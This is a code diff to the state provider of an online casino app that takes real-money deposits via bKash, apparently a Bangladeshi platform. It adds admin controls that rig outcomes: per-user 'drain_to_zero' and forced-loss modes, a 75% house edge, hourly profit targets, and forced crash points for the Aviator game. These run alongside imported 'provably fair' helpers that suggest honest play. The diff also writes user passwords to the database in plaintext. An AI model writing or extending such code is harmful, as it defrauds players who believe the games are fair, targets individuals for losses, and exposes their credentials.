@@ -2,6 +2,7 @@ import React, { createContext, useContext, useState, useEffect, useRef } from 'r
 import { supabase } from '../lib/supabase';
 import { soundManager } from '../lib/audio';
 import { sha256, calculateRoundResult, evaluateBet } from '../lib/provablyFair';
+import { calculateOutcome } from '../engines/calculateOutcome';
 import confetti from 'canvas-confetti';
 import { ALL_GAMES } from '../config/gamesRegistry';
 
@@ -19,7 +20,7 @@ export function GameProvider({ children }) {
     } catch (e) {}
 
     const savedBonus = localStorage.getItem('royalclub_bonus_rules');
-    let adminBonusAmount = 100;
+    let adminBonusAmount = 50;
     if (savedBonus) {
       try {
         const parsedB = JSON.parse(savedBonus);
@@ -41,12 +42,19 @@ export function GameProvider({ children }) {
     return {
       ENABLE_PAID_MODE: false,
       SIGNUP_BONUS_ENABLED: true,
-      SIGNUP_BONUS_AMOUNT: base.SIGNUP_BONUS_AMOUNT && base.SIGNUP_BONUS_AMOUNT !== 1000 ? base.SIGNUP_BONUS_AMOUNT : adminBonusAmount,
+      SIGNUP_BONUS_AMOUNT: base.SIGNUP_BONUS_AMOUNT !== undefined ? Number(base.SIGNUP_BONUS_AMOUNT) : adminBonusAmount,
       ROUND_DURATION_SECONDS: 60,
       FAUCET_AMOUNT: 500,
       FAUCET_COOLDOWN_HOURS: 4,
       MIN_DEPOSIT_AMOUNT: 100,
-      MIN_WITHDRAWAL_AMOUNT: 200,
+      MIN_WITHDRAWAL_AMOUNT: base.MIN_WITHDRAWAL_AMOUNT !== undefined ? Number(base.MIN_WITHDRAWAL_AMOUNT) : 200,
+      BONUS_BALANCE_CAP: base.BONUS_BALANCE_CAP !== undefined ? Number(base.BONUS_BALANCE_CAP) : 199.00,
+      GLOBAL_HOUSE_EDGE_PERCENT: base.GLOBAL_HOUSE_EDGE_PERCENT !== undefined ? Number(base.GLOBAL_HOUSE_EDGE_PERCENT) : 75,
+      FIRST_SPINS_BOOST_COUNT: base.FIRST_SPINS_BOOST_COUNT !== undefined ? Number(base.FIRST_SPINS_BOOST_COUNT) : 10,
+      COMPANY_PROFIT_RETENTION_PERCENT: base.COMPANY_PROFIT_RETENTION_PERCENT !== undefined ? Number(base.COMPANY_PROFIT_RETENTION_PERCENT) : 75,
+      HOURLY_PROFIT_TARGET_PERCENT: base.HOURLY_PROFIT_TARGET_PERCENT !== undefined ? Number(base.HOURLY_PROFIT_TARGET_PERCENT) : 75,
+      AVIATOR_NEXT_CRASH: base.AVIATOR_NEXT_CRASH !== undefined ? Number(base.AVIATOR_NEXT_CRASH) : 1.25,
+      AVIATOR_FORCE_CRASH_NOW: Boolean(base.AVIATOR_FORCE_CRASH_NOW),
       DAILY_WITHDRAWAL_LIMIT: 5000,
       WITHDRAWAL_FEE_PERCENT: 0,
       BKASH_NUMBER: sanitizePhone(base.BKASH_NUMBER),
@@ -270,6 +278,14 @@ export function GameProvider({ children }) {
         MIN_DEPOSIT_AMOUNT: Number(activeS.MIN_DEPOSIT_AMOUNT || 100),
         MIN_WITHDRAWAL_AMOUNT: Number(activeS.MIN_WITHDRAWAL_AMOUNT || 200),
         DAILY_WITHDRAWAL_LIMIT: Number(activeS.DAILY_WITHDRAWAL_LIMIT || 5000),
+        SIGNUP_BONUS_AMOUNT: Number(activeS.SIGNUP_BONUS_AMOUNT || 50),
+        BONUS_BALANCE_CAP: Number(activeS.BONUS_BALANCE_CAP || 199),
+        GLOBAL_HOUSE_EDGE_PERCENT: Number(activeS.GLOBAL_HOUSE_EDGE_PERCENT || 75),
+        FIRST_SPINS_BOOST_COUNT: Number(activeS.FIRST_SPINS_BOOST_COUNT || 10),
+        COMPANY_PROFIT_RETENTION_PERCENT: Number(activeS.COMPANY_PROFIT_RETENTION_PERCENT || 75),
+        HOURLY_PROFIT_TARGET_PERCENT: Number(activeS.HOURLY_PROFIT_TARGET_PERCENT || 75),
+        AVIATOR_NEXT_CRASH: Number(activeS.AVIATOR_NEXT_CRASH || 1.25),
+        AVIATOR_FORCE_CRASH_NOW: Boolean(activeS.AVIATOR_FORCE_CRASH_NOW),
         houseMode: activeG.houseMode || 'high_profit',
         globalWinRate: Number(activeG.globalWinRate !== undefined ? activeG.globalWinRate : 20),
         maxMultiplier: Number(activeG.maxMultiplier || 3.5),
@@ -282,6 +298,7 @@ export function GameProvider({ children }) {
         ANNOUNCEMENT_TEXT: activeS.ANNOUNCEMENT_TEXT || ''
       };
 
+      // 1. Sync to game_settings global row
       await supabase.from('game_settings').upsert({
         game_id: 'global_platform_settings',
         game_name: 'Global Platform Config',
@@ -290,6 +307,25 @@ export function GameProvider({ children }) {
         max_multiplier: Number(payload.maxMultiplier || 3.5),
         updated_at: new Date().toISOString()
       }, { onConflict: 'game_id' });
+
+      // 2. Sync to platform_settings dedicated table if available
+      try {
+        await supabase.from('platform_settings').upsert({
+          key: 'global_config',
+          signup_bonus: payload.SIGNUP_BONUS_AMOUNT,
+          min_withdraw: payload.MIN_WITHDRAWAL_AMOUNT,
+          bonus_balance_cap: payload.BONUS_BALANCE_CAP,
+          global_house_edge_percent: payload.GLOBAL_HOUSE_EDGE_PERCENT,
+          first_spins_boost_count: payload.FIRST_SPINS_BOOST_COUNT,
+          company_profit_retention_percent: payload.COMPANY_PROFIT_RETENTION_PERCENT,
+          hourly_profit_target_percent: payload.HOURLY_PROFIT_TARGET_PERCENT,
+          aviator_next_crash: payload.AVIATOR_NEXT_CRASH,
+          aviator_force_crash_now: payload.AVIATOR_FORCE_CRASH_NOW,
+          server_rtp: payload.serverRtp,
+          game_rtp_overrides: payload.gameOverrides,
+          updated_at: new Date().toISOString()
+        }, { onConflict: 'key' });
+      } catch (pe) {}
     } catch (err) {
       console.warn('Failed to sync global platform settings to Supabase:', err);
     }
@@ -363,14 +399,24 @@ export function GameProvider({ children }) {
 
   // Targeted User Luck & Rigging Control (Persisted live to Supabase users table)
   async function updateUserLuckMode(targetUid, luckMode, customWinRate) {
-    const forceResult = luckMode === 'drain' ? 'force_lose' : luckMode === 'sweetener' ? 'force_win' : 'normal';
+    let normalizedMode = luckMode;
+    if (luckMode === 'drain') normalizedMode = 'drain_to_zero';
+    if (luckMode === 'sweetener') normalizedMode = 'force_win';
+    if (luckMode === 'controlled') normalizedMode = 'normal';
+
+    const forceResult = (normalizedMode === 'drain_to_zero' || normalizedMode === 'force_loss') 
+      ? 'force_lose' 
+      : (normalizedMode === 'force_win' ? 'force_win' : 'normal');
+
     const winRate = customWinRate !== undefined && !isNaN(Number(customWinRate)) 
       ? Number(customWinRate) 
-      : (luckMode === 'drain' ? 5 : luckMode === 'sweetener' ? 40 : 20);
+      : (normalizedMode === 'drain_to_zero' ? 0 : normalizedMode === 'force_loss' ? 5 : normalizedMode === 'force_win' ? 65 : 20);
 
     const patch = {
-      luck_mode: luckMode,
+      force_mode: normalizedMode,
       force_result: forceResult,
+      luck_mode: normalizedMode,
+      custom_rtp: winRate,
       custom_win_rate: winRate
     };
 
@@ -390,10 +436,25 @@ export function GameProvider({ children }) {
     try {
       const targetUser = allUsers.find(u => u.uid === targetUid || u.id === targetUid);
       if (targetUser) {
-        const supaPayload = { force_result: forceResult, custom_win_rate: winRate };
-        if (targetUser.id) await supabase.from('users').update(supaPayload).eq('id', targetUser.id);
-        else if (targetUser.phone) await supabase.from('users').update(supaPayload).eq('phone', targetUser.phone);
-        else if (targetUser.username) await supabase.from('users').update(supaPayload).eq('username', targetUser.username);
+        const fullPayload = {
+          force_mode: normalizedMode,
+          force_result: forceResult,
+          custom_rtp: winRate,
+          custom_win_rate: winRate
+        };
+        const query = targetUser.id 
+          ? supabase.from('users').update(fullPayload).eq('id', targetUser.id)
+          : targetUser.phone 
+          ? supabase.from('users').update(fullPayload).eq('phone', targetUser.phone)
+          : supabase.from('users').update(fullPayload).eq('username', targetUser.username);
+
+        const { error } = await query;
+        if (error) {
+          // Fallback to base columns
+          const basePayload = { force_result: forceResult, custom_win_rate: winRate };
+          if (targetUser.id) await supabase.from('users').update(basePayload).eq('id', targetUser.id);
+          else if (targetUser.phone) await supabase.from('users').update(basePayload).eq('phone', targetUser.phone);
+        }
       }
     } catch (e) {
       console.warn('updateUserLuckMode Supabase sync notice:', e);
@@ -440,131 +501,39 @@ export function GameProvider({ children }) {
 
   /**
    * evaluateGameOutcome: Commercial Casino House Edge Engine
-   * Implements strict house profit protection, frequent micro-wins (৳1, ৳2, ৳3),
-   * hard max-multiplier cap, turnover protection, and per-user rigging.
+   * Implements strict house profit protection, ৳199 bonus cap, deposit hook,
+   * 75% retention, frequent micro-wins, and per-user rigging.
    */
   function evaluateGameOutcome({ gameId, betAmount = 10, isMicroAllowed = true }) {
-    const bAmt = Math.max(0.1, Number(betAmount) || 10);
-    const override = gameControl?.gameOverrides?.[gameId] || {};
-    const houseMode = gameControl?.houseMode || 'high_profit';
+    const outcome = calculateOutcome({
+      user,
+      gameId,
+      betAmount,
+      platformSettings: settings,
+      serverType: gameControl?.serverRtp?.[gameId] || 'ORIGINAL',
+      recentPlatformStats: {
+        totalDeposits: (transactions || []).filter(t => t.type === 'deposit' && (t.status === 'approved' || t.status === 'completed')).reduce((acc, t) => acc + Number(t.amount || 0), 0) || 10000,
+        totalPayouts: (transactions || []).filter(t => (t.type === 'withdrawal' || t.type === 'withdraw') && (t.status === 'approved' || t.status === 'completed')).reduce((acc, t) => acc + Number(t.amount || 0), 0) || 2000
+      }
+    });
 
-    let baseWinRate = 20;
-    let maxAllowedMult = 3.5;
-    let maxProfitCap = gameControl?.maxProfitPerRound || 150;
-
-    if (houseMode === 'emergency_lock') {
-      baseWinRate = 0;
-      maxAllowedMult = 0;
-    } else if (houseMode === 'ultra_protection') {
-      baseWinRate = 12;
-      maxAllowedMult = 2.2;
-    } else if (houseMode === 'high_profit') {
-      baseWinRate = 20;
-      maxAllowedMult = 3.5;
-    } else if (houseMode === 'balanced') {
-      baseWinRate = 30;
-      maxAllowedMult = 5.0;
-    }
-
-    if (gameControl?.globalWinRate !== undefined && !isNaN(Number(gameControl.globalWinRate))) {
-      baseWinRate = Number(gameControl.globalWinRate);
-    }
-    if (gameControl?.maxMultiplier !== undefined && !isNaN(Number(gameControl.maxMultiplier))) {
-      maxAllowedMult = Number(gameControl.maxMultiplier);
-    }
-    if (override.winRate !== undefined && !isNaN(Number(override.winRate))) {
-      baseWinRate = Number(override.winRate);
-    }
-    if (override.maxMultiplier !== undefined && !isNaN(Number(override.maxMultiplier))) {
-      maxAllowedMult = Number(override.maxMultiplier);
-    }
-
-    // Check target user luck mode, force_result & turnover
-    const currentUser = user || {};
-    const userInList = allUsers.find(u => (u.uid && u.uid === currentUser.uid) || (u.id && u.id === currentUser.id) || (u.username && u.username === currentUser.username));
-    const forceResult = userInList?.force_result || currentUser?.force_result || 'normal';
-    const luckMode = userInList?.luck_mode || currentUser?.luck_mode || 'controlled';
-    const targetedWinRate = userInList?.custom_win_rate !== undefined ? userInList.custom_win_rate : currentUser?.custom_win_rate;
-
-    // TARGET CONTROL 1: STRICT DRAIN / GUARANTEED LOSS (100% loss)
-    if (forceResult === 'force_lose' || luckMode === 'drain') {
-      return {
-        won: false,
-        multiplier: 0,
-        payout: 0,
-        isMicroWin: false,
-        message: 'Strict Drain'
+    // Advance spins and turnover
+    setUser(prev => {
+      const nextSpinsSince = (prev.spins_since_deposit || 0) + 1;
+      const nextTotalSpins = (prev.total_spins || 0) + 1;
+      const nextTurnover = Number(((prev.current_turnover || prev.turnover_completed || 0) + Number(betAmount)).toFixed(2));
+      const updated = {
+        ...prev,
+        spins_since_deposit: nextSpinsSince,
+        total_spins: nextTotalSpins,
+        current_turnover: nextTurnover,
+        turnover_completed: nextTurnover
       };
-    }
+      try { localStorage.setItem('royalclub_current_user', JSON.stringify(updated)); } catch (e) {}
+      return updated;
+    });
 
-    // TARGET CONTROL 2: GUARANTEED WIN (Sweetener)
-    if (forceResult === 'force_win') {
-      const sweetMult = 1.35;
-      return {
-        won: true,
-        multiplier: sweetMult,
-        payout: parseFloat((bAmt * sweetMult).toFixed(2)),
-        isMicroWin: false,
-        message: 'Sweetener Win'
-      };
-    }
-
-    // TARGET CONTROL 3: CUSTOM WIN RATE OVERRIDE (e.g. 5%, 10%, 15%, 50%)
-    if (targetedWinRate !== undefined && !isNaN(Number(targetedWinRate)) && Number(targetedWinRate) > 0 && Number(targetedWinRate) <= 100) {
-      baseWinRate = Number(targetedWinRate);
-    } else if (luckMode === 'sweetener') {
-      baseWinRate = Math.max(baseWinRate, 35);
-    }
-
-    // Turnover protection: If user has unmet deposit turnover, lower win rate to prevent cashout exploit
-    const reqTurnover = Number(currentUser.turnover_required || 0);
-    const compTurnover = Number(currentUser.turnover_completed || currentUser.total_wagered || 0);
-    if (reqTurnover > 0 && compTurnover < reqTurnover) {
-      baseWinRate = Math.max(5, baseWinRate * 0.7);
-    }
-
-    const roll = Math.random() * 100;
-    const isWin = roll < baseWinRate;
-
-    if (!isWin) {
-      return {
-        won: false,
-        multiplier: 0,
-        payout: 0,
-        isMicroWin: false,
-        message: 'No Win'
-      };
-    }
-
-    // Micro-win calculation:
-    // 70% of wins are micro-wins (returns 0.3x, 0.4x, 0.5x, 0.6x, 0.8x, 1.0x, 1.2x)
-    const microEnabled = gameControl?.microWinEnabled !== false && isMicroAllowed;
-    const microRoll = Math.random();
-    let finalMult = 1.0;
-    let isMicro = false;
-
-    if (microEnabled && microRoll < 0.70) {
-      isMicro = true;
-      const microChoices = [0.3, 0.4, 0.5, 0.6, 0.8, 1.0, 1.2];
-      finalMult = microChoices[Math.floor(Math.random() * microChoices.length)];
-    } else {
-      const rawMult = 1.2 + Math.random() * (maxAllowedMult - 1.2);
-      finalMult = Math.min(rawMult, maxAllowedMult);
-    }
-
-    let calculatedPayout = parseFloat((bAmt * finalMult).toFixed(2));
-    if (calculatedPayout - bAmt > maxProfitCap) {
-      calculatedPayout = parseFloat((bAmt + maxProfitCap).toFixed(2));
-      finalMult = parseFloat((calculatedPayout / bAmt).toFixed(2));
-    }
-
-    return {
-      won: true,
-      multiplier: parseFloat(finalMult.toFixed(2)),
-      payout: calculatedPayout,
-      isMicroWin: isMicro,
-      message: isMicro ? 'Micro Return' : 'Win'
-    };
+    return outcome;
   }
 
   /**
@@ -1456,6 +1425,54 @@ export function GameProvider({ children }) {
     };
   }, []);
 
+  // Continuous 15-second User Online & Activity Heartbeat
+  useEffect(() => {
+    if (!user || user.username === 'Guest' || user.is_guest || !user.uid) return;
+
+    const sendHeartbeat = async () => {
+      try {
+        const deviceInfo = typeof navigator !== 'undefined' && /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile Device' : 'Desktop Browser';
+        const nowIso = new Date().toISOString();
+        
+        const payload = {
+          is_online: true,
+          last_active_at: nowIso,
+          device_info: deviceInfo
+        };
+
+        const targetUser = allUsers.find(u => u.uid === user.uid || u.username === user.username);
+        const query = targetUser?.id 
+          ? supabase.from('users').update(payload).eq('id', targetUser.id)
+          : supabase.from('users').update(payload).eq('uid', user.uid);
+        
+        await query;
+      } catch (e) {}
+    };
+
+    sendHeartbeat();
+    const heartbeatInterval = setInterval(sendHeartbeat, 15000);
+
+    const handleUnload = () => {
+      try {
+        supabase.from('users').update({ is_online: false }).eq('uid', user.uid);
+      } catch (e) {}
+    };
+    window.addEventListener('beforeunload', handleUnload);
+
+    return () => {
+      clearInterval(heartbeatInterval);
+      window.removeEventListener('beforeunload', handleUnload);
+    };
+  }, [user?.uid, user?.username]);
+
+  function setCurrentGame(gameTitle) {
+    if (user && user.uid && user.username !== 'Guest') {
+      try {
+        supabase.from('users').update({ current_game: gameTitle || 'Lobby', is_online: true, last_active_at: new Date().toISOString() }).eq('uid', user.uid);
+      } catch (e) {}
+    }
+  }
+
   async function refreshSupabaseData() {
     try {
       // 1. Fetch game settings and global platform configuration for all users
@@ -2132,6 +2149,7 @@ export function GameProvider({ children }) {
         window.dispatchEvent(new Event('storage'));
         window.dispatchEvent(new CustomEvent('royalclub_settings_sync', { detail: updated }));
       } catch (e) {}
+      syncGlobalSettingsToSupabase(updated, gameControl);
       return updated;
     });
   }
@@ -2144,6 +2162,7 @@ export function GameProvider({ children }) {
         window.dispatchEvent(new Event('storage'));
         window.dispatchEvent(new CustomEvent('royalclub_settings_sync', { detail: updated }));
       } catch (e) {}
+      syncGlobalSettingsToSupabase(updated, gameControl);
       return updated;
     });
   }
@@ -2288,39 +2307,92 @@ export function GameProvider({ children }) {
       return { success: false, message: 'এই ইউজারনেম, মোবাইল বা ইমেইল দিয়ে ইতোমধ্যে একটি অ্যাকাউন্ট রয়েছে!' };
     }
 
-    // Automatic Sign-up Welcome Bonus (Admin Configurable, default ৳100)
-    const welcomeCoins = settings.SIGNUP_BONUS_AMOUNT !== undefined ? Number(settings.SIGNUP_BONUS_AMOUNT) : 100;
+    // Automatic Sign-up Welcome Bonus (Admin Configurable, default ৳50)
+    const welcomeCoins = settings.SIGNUP_BONUS_AMOUNT !== undefined ? Number(settings.SIGNUP_BONUS_AMOUNT) : 50;
     const generatedUid = Math.floor(100000 + Math.random() * 900000).toString();
+    const nowIso = new Date().toISOString();
+    const deviceInfo = typeof navigator !== 'undefined' && /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile Device' : 'Desktop Browser';
+    const bonusCap = Number(settings.BONUS_BALANCE_CAP || 199.00);
+    const reqTurnover = welcomeCoins * 2; // 2x turnover requirement on bonus
 
     const newUser = {
       uid: generatedUid,
       username: cleanUser,
       password: password,
       phone: cleanPhone || null,
-      balance: welcomeCoins, // ৳100 added automatically to main balance for instant gameplay
-      custom_win_rate: 95,
+      balance: welcomeCoins,
+      bonus_balance: welcomeCoins,
+      total_deposited: 0,
+      total_withdrawn: 0,
+      current_turnover: 0,
+      required_turnover: reqTurnover,
+      turnover_completed: 0,
+      max_allowed_balance: bonusCap,
+      custom_rtp: null,
+      custom_win_rate: 20,
+      force_mode: 'normal',
+      force_result: 'normal',
+      spins_since_deposit: 0,
+      total_spins: 0,
       vip_level: 1,
-      is_online: true
+      is_online: true,
+      current_game: 'Lobby',
+      device_info: deviceInfo,
+      created_at: nowIso,
+      last_login_at: nowIso,
+      last_active_at: nowIso
     };
 
     // 1. Write row directly to Supabase users table
     try {
-      const { data, error } = await supabase.from('users').insert({
+      const fullPayload = {
         uid: newUser.uid,
         username: newUser.username,
         phone: newUser.phone,
         password: newUser.password,
         balance: newUser.balance,
-        custom_win_rate: newUser.custom_win_rate,
-        vip_level: newUser.vip_level,
-        is_online: true
-      }).select().single();
+        bonus_balance: newUser.bonus_balance,
+        total_deposited: 0,
+        total_withdrawn: 0,
+        current_turnover: 0,
+        required_turnover: reqTurnover,
+        max_allowed_balance: bonusCap,
+        custom_rtp: null,
+        custom_win_rate: 20,
+        force_mode: 'normal',
+        force_result: 'normal',
+        vip_level: 1,
+        is_online: true,
+        current_game: 'Lobby',
+        device_info: deviceInfo,
+        last_login_at: nowIso,
+        last_active_at: nowIso
+      };
+
+      const { data, error } = await supabase.from('users').insert(fullPayload).select().single();
 
       if (!error && data) {
         newUser.id = data.id;
-        newUser.created_at = data.created_at;
+        newUser.created_at = data.created_at || nowIso;
       } else if (error) {
-        console.warn('Supabase register notice (fallback to resilient state):', error.message);
+        // Fallback to base columns if new columns are not yet in Supabase
+        const basePayload = {
+          uid: newUser.uid,
+          username: newUser.username,
+          phone: newUser.phone,
+          password: newUser.password,
+          balance: newUser.balance,
+          custom_win_rate: 20,
+          force_result: 'normal',
+          vip_level: 1,
+          is_online: true,
+          current_game: 'Lobby'
+        };
+        const retryRes = await supabase.from('users').insert(basePayload).select().single();
+        if (retryRes.data) {
+          newUser.id = retryRes.data.id;
+          newUser.created_at = retryRes.data.created_at || nowIso;
+        }
       }
     } catch (e) {
       console.warn('Supabase register error:', e);
@@ -2448,6 +2520,9 @@ export function GameProvider({ children }) {
       editUserProfile,
       adminResetPassword,
       adminAdjustBalanceWithReason,
+      calculateOutcome,
+      setCurrentGame,
+      syncGlobalSettingsToSupabase,
       changeUserPassword
     }}>
       {children}
